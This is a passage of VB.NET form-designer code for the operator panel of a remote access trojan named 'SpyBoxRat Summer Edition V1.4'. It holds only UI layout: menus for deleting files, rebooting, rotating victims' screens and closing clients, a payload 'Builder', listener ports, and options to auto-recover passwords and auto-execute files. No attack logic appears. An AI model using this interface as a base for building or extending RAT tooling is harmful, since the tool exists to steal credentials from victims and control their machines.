        Me.DeleteFilesToolStripMenuItem.Name = "DeleteFilesToolStripMenuItem"
        Me.DeleteFilesToolStripMenuItem.Size = New System.Drawing.Size(180, 22)
        Me.DeleteFilesToolStripMenuItem.Text = "Delete Files"
        '
        'DeleteFilesRebootToolStripMenuItem
        '
        Me.DeleteFilesRebootToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.DeleteFilesRebootToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.DeleteFilesRebootToolStripMenuItem.Name = "DeleteFilesRebootToolStripMenuItem"
        Me.DeleteFilesRebootToolStripMenuItem.Size = New System.Drawing.Size(180, 22)
        Me.DeleteFilesRebootToolStripMenuItem.Text = "Delete Files | Reboot"
        '
        'MonitorScreenToolStripMenuItem
        '
        Me.MonitorScreenToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.MonitorScreenToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.RotateToolStripMenuItem})
        Me.MonitorScreenToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.MonitorScreenToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_monitor_32
        Me.MonitorScreenToolStripMenuItem.Name = "MonitorScreenToolStripMenuItem"
        Me.MonitorScreenToolStripMenuItem.Size = New System.Drawing.Size(164, 22)
        Me.MonitorScreenToolStripMenuItem.Text = "Monitor | Screen"
        '
        'RotateToolStripMenuItem
        '
        Me.RotateToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.RotateToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.R0ToolStripMenuItem2, Me.R90ToolStripMenuItem3, Me.R180ToolStripMenuItem4, Me.R270ToolStripMenuItem5})
        Me.RotateToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.RotateToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_3d_rotate_32
        Me.RotateToolStripMenuItem.Name = "RotateToolStripMenuItem"
        Me.RotateToolStripMenuItem.Size = New System.Drawing.Size(108, 22)
        Me.RotateToolStripMenuItem.Text = "Rotate"
        '
        'R0ToolStripMenuItem2
        '
        Me.R0ToolStripMenuItem2.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.R0ToolStripMenuItem2.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.R0ToolStripMenuItem2.Image = Global.AnonMon.My.Resources.Resources.icons8_0_32
        Me.R0ToolStripMenuItem2.Name = "R0ToolStripMenuItem2"
        Me.R0ToolStripMenuItem2.Size = New System.Drawing.Size(92, 22)
        Me.R0ToolStripMenuItem2.Text = "0"
        '
        'R90ToolStripMenuItem3
        '
        Me.R90ToolStripMenuItem3.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.R90ToolStripMenuItem3.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.R90ToolStripMenuItem3.Image = Global.AnonMon.My.Resources.Resources.icons8_90_degrees_32
        Me.R90ToolStripMenuItem3.Name = "R90ToolStripMenuItem3"
        Me.R90ToolStripMenuItem3.Size = New System.Drawing.Size(92, 22)
        Me.R90ToolStripMenuItem3.Text = "90"
        '
        'R180ToolStripMenuItem4
        '
        Me.R180ToolStripMenuItem4.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.R180ToolStripMenuItem4.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.R180ToolStripMenuItem4.Image = Global.AnonMon.My.Resources.Resources.icons8_180_degree_32
        Me.R180ToolStripMenuItem4.Name = "R180ToolStripMenuItem4"
        Me.R180ToolStripMenuItem4.Size = New System.Drawing.Size(92, 22)
        Me.R180ToolStripMenuItem4.Text = "180"
        '
        'R270ToolStripMenuItem5
        '
        Me.R270ToolStripMenuItem5.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.R270ToolStripMenuItem5.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.R270ToolStripMenuItem5.Image = Global.AnonMon.My.Resources.Resources.icons8_270_degrees_32
        Me.R270ToolStripMenuItem5.Name = "R270ToolStripMenuItem5"
        Me.R270ToolStripMenuItem5.Size = New System.Drawing.Size(92, 22)
        Me.R270ToolStripMenuItem5.Text = "270"
        '
        'ClientToolStripMenuItem
        '
        Me.ClientToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.ClientToolStripMenuItem.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.CloseDeleteToolStripMenuItem, Me.CloseToolStripMenuItem})
        Me.ClientToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.ClientToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_spyqsqs
        Me.ClientToolStripMenuItem.Name = "ClientToolStripMenuItem"
        Me.ClientToolStripMenuItem.Size = New System.Drawing.Size(202, 30)
        Me.ClientToolStripMenuItem.Text = "Client"
        '
        'CloseDeleteToolStripMenuItem
        '
        Me.CloseDeleteToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.CloseDeleteToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_trashsa1
        Me.CloseDeleteToolStripMenuItem.Name = "CloseDeleteToolStripMenuItem"
        Me.CloseDeleteToolStripMenuItem.Size = New System.Drawing.Size(145, 22)
        Me.CloseDeleteToolStripMenuItem.Text = "Close | Delete"
        '
        'CloseToolStripMenuItem
        '
        Me.CloseToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.CloseToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_delete
        Me.CloseToolStripMenuItem.Name = "CloseToolStripMenuItem"
        Me.CloseToolStripMenuItem.Size = New System.Drawing.Size(145, 22)
        Me.CloseToolStripMenuItem.Text = "Close"
        '
        'BuilderToolStripMenuItem
        '
        Me.BuilderToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.BuilderToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.BuilderToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_toolbox1235
        Me.BuilderToolStripMenuItem.Name = "BuilderToolStripMenuItem"
        Me.BuilderToolStripMenuItem.Size = New System.Drawing.Size(202, 30)
        Me.BuilderToolStripMenuItem.Text = "Builder"
        '
        'TestToolStripMenuItem1
        '
        Me.TestToolStripMenuItem1.DropDownItems.AddRange(New System.Windows.Forms.ToolStripItem() {Me.Test1ToolStripMenuItem, Me.Test2ToolStripMenuItem})
        Me.TestToolStripMenuItem1.Name = "TestToolStripMenuItem1"
        Me.TestToolStripMenuItem1.Size = New System.Drawing.Size(202, 30)
        Me.TestToolStripMenuItem1.Text = "Test"
        Me.TestToolStripMenuItem1.Visible = False
        '
        'Test1ToolStripMenuItem
        '
        Me.Test1ToolStripMenuItem.Name = "Test1ToolStripMenuItem"
        Me.Test1ToolStripMenuItem.Size = New System.Drawing.Size(100, 22)
        Me.Test1ToolStripMenuItem.Text = "Test1"
        '
        'Test2ToolStripMenuItem
        '
        Me.Test2ToolStripMenuItem.Name = "Test2ToolStripMenuItem"
        Me.Test2ToolStripMenuItem.Size = New System.Drawing.Size(100, 22)
        Me.Test2ToolStripMenuItem.Text = "Test2"
        '
        'AboutToolStripMenuItem
        '
        Me.AboutToolStripMenuItem.BackColor = System.Drawing.Color.FromArgb(CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.AboutToolStripMenuItem.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer), CType(CType(80, Byte), Integer))
        Me.AboutToolStripMenuItem.Image = Global.AnonMon.My.Resources.Resources.icons8_question_mark_32
        Me.AboutToolStripMenuItem.Name = "AboutToolStripMenuItem"
        Me.AboutToolStripMenuItem.Size = New System.Drawing.Size(202, 30)
        Me.AboutToolStripMenuItem.Text = "About"
        '
        'ImageList1
        '
        Me.ImageList1.ColorDepth = System.Windows.Forms.ColorDepth.Depth32Bit
        Me.ImageList1.ImageSize = New System.Drawing.Size(32, 32)
        Me.ImageList1.TransparentColor = System.Drawing.Color.Transparent
        '
        'XuiCustomGroupbox2
        '
        Me.XuiCustomGroupbox2.BackColor = System.Drawing.Color.White
        Me.XuiCustomGroupbox2.BorderColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.XuiCustomGroupbox2.BorderWidth = 1
        Me.XuiCustomGroupbox2.Controls.Add(Me.PictureBox5)
        Me.XuiCustomGroupbox2.Controls.Add(Me.AUTO_CHK_FILE)
        Me.XuiCustomGroupbox2.Controls.Add(Me.PictureBox4)
        Me.XuiCustomGroupbox2.Controls.Add(Me.PictureBox3)
        Me.XuiCustomGroupbox2.Controls.Add(Me.Auto_RECOV)
        Me.XuiCustomGroupbox2.Controls.Add(Me.XuiCheckBox1)
        Me.XuiCustomGroupbox2.Location = New System.Drawing.Point(293, 7)
        Me.XuiCustomGroupbox2.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.XuiCustomGroupbox2.Name = "XuiCustomGroupbox2"
        Me.XuiCustomGroupbox2.Padding = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.XuiCustomGroupbox2.ShowText = True
        Me.XuiCustomGroupbox2.Size = New System.Drawing.Size(265, 183)
        Me.XuiCustomGroupbox2.TabIndex = 2
        Me.XuiCustomGroupbox2.TabStop = False
        Me.XuiCustomGroupbox2.Text = "Miscellaneous Settings"
        Me.XuiCustomGroupbox2.TextColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(235, Byte), Integer))
        '
        'PictureBox5
        '
        Me.PictureBox5.Image = Global.AnonMon.My.Resources.Resources.icons8_Syringe_with_a_drop_of_bazlood_32
        Me.PictureBox5.Location = New System.Drawing.Point(6, 85)
        Me.PictureBox5.Name = "PictureBox5"
        Me.PictureBox5.Size = New System.Drawing.Size(22, 22)
        Me.PictureBox5.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.PictureBox5.TabIndex = 8
        Me.PictureBox5.TabStop = False
        '
        'AUTO_CHK_FILE
        '
        Me.AUTO_CHK_FILE.CheckboxCheckColor = System.Drawing.Color.White
        Me.AUTO_CHK_FILE.CheckboxColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.AUTO_CHK_FILE.CheckboxHoverColor = System.Drawing.Color.FromArgb(CType(CType(249, Byte), Integer), CType(CType(55, Byte), Integer), CType(CType(98, Byte), Integer))
        Me.AUTO_CHK_FILE.CheckboxStyle = XanderUI.XUICheckBox.Style.Material
        Me.AUTO_CHK_FILE.Checked = False
        Me.AUTO_CHK_FILE.ForeColor = System.Drawing.Color.FromArgb(CType(CType(40, Byte), Integer), CType(CType(40, Byte), Integer), CType(CType(40, Byte), Integer))
        Me.AUTO_CHK_FILE.Location = New System.Drawing.Point(34, 85)
        Me.AUTO_CHK_FILE.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.AUTO_CHK_FILE.Name = "AUTO_CHK_FILE"
        Me.AUTO_CHK_FILE.Size = New System.Drawing.Size(180, 22)
        Me.AUTO_CHK_FILE.TabIndex = 7
        Me.AUTO_CHK_FILE.Text = "Auto Execute File"
        Me.AUTO_CHK_FILE.TickThickness = 2
        '
        'PictureBox4
        '
        Me.PictureBox4.Image = Global.AnonMon.My.Resources.Resources.icons8_automatic_32
        Me.PictureBox4.Location = New System.Drawing.Point(6, 55)
        Me.PictureBox4.Name = "PictureBox4"
        Me.PictureBox4.Size = New System.Drawing.Size(22, 22)
        Me.PictureBox4.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.PictureBox4.TabIndex = 5
        Me.PictureBox4.TabStop = False
        '
        'PictureBox3
        '
        Me.PictureBox3.Image = Global.AnonMon.My.Resources.Resources.icons8_key
        Me.PictureBox3.Location = New System.Drawing.Point(6, 22)
        Me.PictureBox3.Name = "PictureBox3"
        Me.PictureBox3.Size = New System.Drawing.Size(22, 22)
        Me.PictureBox3.SizeMode = System.Windows.Forms.PictureBoxSizeMode.StretchImage
        Me.PictureBox3.TabIndex = 4
        Me.PictureBox3.TabStop = False
        '
        'Auto_RECOV
        '
        Me.Auto_RECOV.CheckboxCheckColor = System.Drawing.Color.White
        Me.Auto_RECOV.CheckboxColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.Auto_RECOV.CheckboxHoverColor = System.Drawing.Color.FromArgb(CType(CType(249, Byte), Integer), CType(CType(55, Byte), Integer), CType(CType(98, Byte), Integer))
        Me.Auto_RECOV.CheckboxStyle = XanderUI.XUICheckBox.Style.Material
        Me.Auto_RECOV.Checked = False
        Me.Auto_RECOV.ForeColor = System.Drawing.Color.FromArgb(CType(CType(40, Byte), Integer), CType(CType(40, Byte), Integer), CType(CType(40, Byte), Integer))
        Me.Auto_RECOV.Location = New System.Drawing.Point(34, 55)
        Me.Auto_RECOV.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.Auto_RECOV.Name = "Auto_RECOV"
        Me.Auto_RECOV.Size = New System.Drawing.Size(180, 22)
        Me.Auto_RECOV.TabIndex = 3
        Me.Auto_RECOV.Text = "Auto Recovery Passwords"
        Me.Auto_RECOV.TickThickness = 2
        '
        'XuiCheckBox1
        '
        Me.XuiCheckBox1.CheckboxCheckColor = System.Drawing.Color.White
        Me.XuiCheckBox1.CheckboxColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.XuiCheckBox1.CheckboxHoverColor = System.Drawing.Color.FromArgb(CType(CType(249, Byte), Integer), CType(CType(55, Byte), Integer), CType(CType(98, Byte), Integer))
        Me.XuiCheckBox1.CheckboxStyle = XanderUI.XUICheckBox.Style.Material
        Me.XuiCheckBox1.Checked = False
        Me.XuiCheckBox1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(40, Byte), Integer), CType(CType(40, Byte), Integer), CType(CType(40, Byte), Integer))
        Me.XuiCheckBox1.Location = New System.Drawing.Point(34, 22)
        Me.XuiCheckBox1.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.XuiCheckBox1.Name = "XuiCheckBox1"
        Me.XuiCheckBox1.Size = New System.Drawing.Size(155, 22)
        Me.XuiCheckBox1.TabIndex = 1
        Me.XuiCheckBox1.Text = "Auto Save Passwords"
        Me.XuiCheckBox1.TickThickness = 2
        '
        'XuiCustomGroupbox1
        '
        Me.XuiCustomGroupbox1.BackColor = System.Drawing.Color.White
        Me.XuiCustomGroupbox1.BorderColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.XuiCustomGroupbox1.BorderWidth = 1
        Me.XuiCustomGroupbox1.Controls.Add(Me.XuiCustomGroupbox4)
        Me.XuiCustomGroupbox1.Controls.Add(Me.UcBtnExt1)
        Me.XuiCustomGroupbox1.Controls.Add(Me.XuiCustomGroupbox3)
        Me.XuiCustomGroupbox1.Location = New System.Drawing.Point(6, 7)
        Me.XuiCustomGroupbox1.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.XuiCustomGroupbox1.Name = "XuiCustomGroupbox1"
        Me.XuiCustomGroupbox1.Padding = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.XuiCustomGroupbox1.ShowText = True
        Me.XuiCustomGroupbox1.Size = New System.Drawing.Size(265, 183)
        Me.XuiCustomGroupbox1.TabIndex = 3
        Me.XuiCustomGroupbox1.TabStop = False
        Me.XuiCustomGroupbox1.Text = "Connection Settings"
        Me.XuiCustomGroupbox1.TextColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(235, Byte), Integer))
        '
        'XuiCustomGroupbox4
        '
        Me.XuiCustomGroupbox4.BorderColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.XuiCustomGroupbox4.BorderWidth = 1
        Me.XuiCustomGroupbox4.Controls.Add(Me.NumericUpDown2)
        Me.XuiCustomGroupbox4.Location = New System.Drawing.Point(6, 85)
        Me.XuiCustomGroupbox4.Name = "XuiCustomGroupbox4"
        Me.XuiCustomGroupbox4.ShowText = True
        Me.XuiCustomGroupbox4.Size = New System.Drawing.Size(253, 57)
        Me.XuiCustomGroupbox4.TabIndex = 17
        Me.XuiCustomGroupbox4.TabStop = False
        Me.XuiCustomGroupbox4.Text = "Remote Viewer Port : "
        Me.XuiCustomGroupbox4.TextColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(235, Byte), Integer))
        '
        'NumericUpDown2
        '
        Me.NumericUpDown2.BackColor = System.Drawing.Color.White
        Me.NumericUpDown2.ForeColor = System.Drawing.Color.FromArgb(CType(CType(40, Byte), Integer), CType(CType(40, Byte), Integer), CType(CType(40, Byte), Integer))
        Me.NumericUpDown2.Location = New System.Drawing.Point(6, 22)
        Me.NumericUpDown2.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.NumericUpDown2.Maximum = New Decimal(New Integer() {90000, 0, 0, 0})
        Me.NumericUpDown2.Name = "NumericUpDown2"
        Me.NumericUpDown2.Size = New System.Drawing.Size(241, 22)
        Me.NumericUpDown2.TabIndex = 6
        Me.NumericUpDown2.Value = New Decimal(New Integer() {8081, 0, 0, 0})
        '
        'UcBtnExt1
        '
        Me.UcBtnExt1.BackColor = System.Drawing.Color.White
        Me.UcBtnExt1.BtnBackColor = System.Drawing.Color.White
        Me.UcBtnExt1.BtnFont = New System.Drawing.Font("Segoe UI", 8.25!)
        Me.UcBtnExt1.BtnForeColor = System.Drawing.Color.White
        Me.UcBtnExt1.BtnText = "Listen !"
        Me.UcBtnExt1.ConerRadius = 5
        Me.UcBtnExt1.Cursor = System.Windows.Forms.Cursors.Hand
        Me.UcBtnExt1.EnabledMouseEffect = True
        Me.UcBtnExt1.FillColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.UcBtnExt1.Font = New System.Drawing.Font("Microsoft YaHei", 15.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Pixel)
        Me.UcBtnExt1.IsRadius = True
        Me.UcBtnExt1.IsShowRect = True
        Me.UcBtnExt1.IsShowTips = False
        Me.UcBtnExt1.Location = New System.Drawing.Point(6, 145)
        Me.UcBtnExt1.Margin = New System.Windows.Forms.Padding(0)
        Me.UcBtnExt1.Name = "UcBtnExt1"
        Me.UcBtnExt1.RectColor = System.Drawing.Color.FromArgb(CType(CType(100, Byte), Integer), CType(CType(88, Byte), Integer), CType(CType(255, Byte), Integer))
        Me.UcBtnExt1.RectWidth = 1
        Me.UcBtnExt1.Size = New System.Drawing.Size(253, 24)
        Me.UcBtnExt1.TabIndex = 4
        Me.UcBtnExt1.TabStop = False
        Me.UcBtnExt1.TipsColor = System.Drawing.Color.FromArgb(CType(CType(232, Byte), Integer), CType(CType(30, Byte), Integer), CType(CType(99, Byte), Integer))
        Me.UcBtnExt1.TipsText = ""
        '
        'XuiCustomGroupbox3
        '
        Me.XuiCustomGroupbox3.BorderColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.XuiCustomGroupbox3.BorderWidth = 1
        Me.XuiCustomGroupbox3.Controls.Add(Me.NumericUpDown1)
        Me.XuiCustomGroupbox3.Location = New System.Drawing.Point(6, 22)
        Me.XuiCustomGroupbox3.Name = "XuiCustomGroupbox3"
        Me.XuiCustomGroupbox3.ShowText = True
        Me.XuiCustomGroupbox3.Size = New System.Drawing.Size(253, 57)
        Me.XuiCustomGroupbox3.TabIndex = 16
        Me.XuiCustomGroupbox3.TabStop = False
        Me.XuiCustomGroupbox3.Text = "Main Connection Settings"
        Me.XuiCustomGroupbox3.TextColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(235, Byte), Integer))
        '
        'NumericUpDown1
        '
        Me.NumericUpDown1.BackColor = System.Drawing.Color.White
        Me.NumericUpDown1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(40, Byte), Integer), CType(CType(40, Byte), Integer), CType(CType(40, Byte), Integer))
        Me.NumericUpDown1.Location = New System.Drawing.Point(6, 22)
        Me.NumericUpDown1.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.NumericUpDown1.Maximum = New Decimal(New Integer() {90000, 0, 0, 0})
        Me.NumericUpDown1.Name = "NumericUpDown1"
        Me.NumericUpDown1.Size = New System.Drawing.Size(241, 22)
        Me.NumericUpDown1.TabIndex = 1
        Me.NumericUpDown1.Value = New Decimal(New Integer() {8080, 0, 0, 0})
        '
        'Button1
        '
        Me.Button1.Anchor = CType((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.Button1.BackColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.Button1.FlatAppearance.BorderSize = 0
        Me.Button1.FlatAppearance.MouseOverBackColor = System.Drawing.Color.Red
        Me.Button1.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.Button1.ForeColor = System.Drawing.Color.White
        Me.Button1.Location = New System.Drawing.Point(1018, 1)
        Me.Button1.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.Button1.Name = "Button1"
        Me.Button1.Size = New System.Drawing.Size(28, 28)
        Me.Button1.TabIndex = 5
        Me.Button1.Text = "X"
        Me.Button1.UseVisualStyleBackColor = False
        '
        'Button2
        '
        Me.Button2.Anchor = CType((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.Button2.BackColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.Button2.FlatAppearance.BorderSize = 0
        Me.Button2.FlatAppearance.MouseOverBackColor = System.Drawing.Color.Red
        Me.Button2.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.Button2.Font = New System.Drawing.Font("Microsoft Sans Serif", 12.0!, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, CType(0, Byte))
        Me.Button2.ForeColor = System.Drawing.Color.White
        Me.Button2.Location = New System.Drawing.Point(984, 1)
        Me.Button2.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.Button2.Name = "Button2"
        Me.Button2.Size = New System.Drawing.Size(28, 28)
        Me.Button2.TabIndex = 6
        Me.Button2.Text = "+"
        Me.Button2.UseVisualStyleBackColor = False
        '
        'Button3
        '
        Me.Button3.Anchor = CType((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
        Me.Button3.BackColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.Button3.FlatAppearance.BorderSize = 0
        Me.Button3.FlatAppearance.MouseOverBackColor = System.Drawing.Color.Red
        Me.Button3.FlatStyle = System.Windows.Forms.FlatStyle.Flat
        Me.Button3.Font = New System.Drawing.Font("Microsoft Sans Serif", 12.0!)
        Me.Button3.ForeColor = System.Drawing.Color.White
        Me.Button3.Location = New System.Drawing.Point(950, 1)
        Me.Button3.Margin = New System.Windows.Forms.Padding(3, 4, 3, 4)
        Me.Button3.Name = "Button3"
        Me.Button3.Size = New System.Drawing.Size(28, 28)
        Me.Button3.TabIndex = 7
        Me.Button3.Text = "-"
        Me.Button3.UseVisualStyleBackColor = False
        '
        'Label1
        '
        Me.Label1.AutoSize = True
        Me.Label1.ForeColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.Label1.Location = New System.Drawing.Point(73, 10)
        Me.Label1.Name = "Label1"
        Me.Label1.Size = New System.Drawing.Size(169, 13)
        Me.Label1.TabIndex = 13
        Me.Label1.Text = "SpyBoxRat Summer Edition V1.4"
        '
        'TabControlExt3
        '
        Me.TabControlExt3.Alignment = System.Windows.Forms.TabAlignment.Left
        Me.TabControlExt3.BackColor = System.Drawing.Color.FromArgb(CType(CType(43, Byte), Integer), CType(CType(53, Byte), Integer), CType(CType(63, Byte), Integer))
        Me.TabControlExt3.BorderColor = System.Drawing.Color.FromArgb(CType(CType(43, Byte), Integer), CType(CType(53, Byte), Integer), CType(CType(63, Byte), Integer))
        Me.TabControlExt3.Controls.Add(Me.TabPage2)
        Me.TabControlExt3.Controls.Add(Me.TabPage4)
        Me.TabControlExt3.Dock = System.Windows.Forms.DockStyle.Fill
        Me.TabControlExt3.HeaderBackColor = System.Drawing.Color.FromArgb(CType(CType(43, Byte), Integer), CType(CType(53, Byte), Integer), CType(CType(63, Byte), Integer))
        Me.TabControlExt3.HeadSelectedBackColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.TabControlExt3.HeadSelectedBorderColor = System.Drawing.Color.FromArgb(CType(CType(43, Byte), Integer), CType(CType(53, Byte), Integer), CType(CType(63, Byte), Integer))
        Me.TabControlExt3.IsShowCloseBtn = False
        Me.TabControlExt3.ItemSize = New System.Drawing.Size(0, 50)
        Me.TabControlExt3.Location = New System.Drawing.Point(5, 35)
        Me.TabControlExt3.Multiline = True
        Me.TabControlExt3.Name = "TabControlExt3"
        Me.TabControlExt3.SelectedIndex = 0
        Me.TabControlExt3.Size = New System.Drawing.Size(1045, 447)
        Me.TabControlExt3.TabIndex = 14
        '
        'TabPage2
        '
        Me.TabPage2.BackColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.TabPage2.Controls.Add(Me.AeroListView1)
        Me.TabPage2.Controls.Add(Me.ListView2)
        Me.TabPage2.Controls.Add(Me.ToolStrip1)
        Me.TabPage2.ForeColor = System.Drawing.Color.White
        Me.TabPage2.Location = New System.Drawing.Point(54, 4)
        Me.TabPage2.Name = "TabPage2"
        Me.TabPage2.Padding = New System.Windows.Forms.Padding(3)
        Me.TabPage2.Size = New System.Drawing.Size(987, 439)
        Me.TabPage2.TabIndex = 0
        Me.TabPage2.Text = "Clients"
        '
        'AeroListView1
        '
        Me.AeroListView1.BackColor = System.Drawing.Color.FromArgb(CType(CType(80, Byte), Integer), CType(CType(68, Byte), Integer), CType(CType(235, Byte), Integer))
        Me.AeroListView1.Columns.AddRange(New System.Windows.Forms.ColumnHeader() {Me.ColumnHeader1, Me.ColumnHeader2, Me.ColumnHeader3, Me.ColumnHeader4})
        Me.AeroListView1.ContextMenuStrip = Me.REMOTE_TOOL
        Me.AeroListView1.Dock = System.Windows.Forms.DockStyle.Fill
        Me.AeroListView1.ForeColor = System.Drawing.Color.White
        Me.AeroListView1.HideSelection = False
        Me.AeroListView1.Location = New System.Drawing.Point(3, 3)
        Me.AeroListView1.Name = "AeroListView1"
        Me.AeroListView1.Size = New System.Drawing.Size(981, 433)
        Me.AeroListView1.SmallImageList = Me.ImageList1
        Me.AeroListView1.TabIndex = 3
        Me.AeroListView1.UseCompatibleStateImageBehavior = False
        Me.AeroListView1.View = System.Windows.Forms.View.Details
        '
        'ColumnHeader1
        '
